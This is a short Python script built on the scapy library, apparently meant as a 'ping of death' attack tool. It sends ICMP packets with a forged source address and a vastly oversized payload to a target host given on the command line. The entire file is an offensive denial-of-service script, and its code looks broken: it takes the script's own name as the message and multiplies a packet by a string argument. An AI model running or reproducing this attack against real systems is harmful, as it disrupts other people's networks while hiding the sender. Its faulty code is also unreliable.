#!/usr/bin/python

from scapy.all import *
import sys

MESSAGE = sys.argv[0]

NUMBER_PACKETS = sys.argv[1]

pingOFDeath = IP(src="10.1.1.1", dst=sys.argv[2])/ICMP()/(MESSAGE*70000000)
send(NUMBER_PACKETS * pingOFDeath)
